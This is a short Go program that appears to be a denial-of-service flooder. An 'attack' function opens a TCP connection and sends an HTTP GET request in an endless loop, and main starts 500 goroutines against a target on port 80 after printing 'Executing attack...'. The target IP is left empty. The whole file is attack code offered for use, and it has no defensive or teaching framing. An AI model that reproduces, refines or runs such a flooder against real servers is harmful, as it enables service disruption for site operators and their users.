package main

import (
	"fmt"
	"net"
)

type address struct {
	ip   string
	port string
}

func attack(target_address address) {
	target := target_address.ip + ":" + target_address.port
	conn, err := net.Dial("tcp", target)
	if err != nil {
		fmt.Println(err)
		return
	}

	request := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\n\r\n", target_address.ip)

	// Send some data to the server
	for {
		_, err = conn.Write([]byte(request))
		if err != nil {
			fmt.Println(err)
			return
		}
	}

	// Close the connection
	// conn.Close()
}

func main() {
	var target address
	target.ip = ""
	target.port = "80"
	// Connect to the server
	fmt.Println("Executing attack...")
	for i := 0; i < 500; i++ {
		go attack(target)
	}
	for {
		continue
	}

}
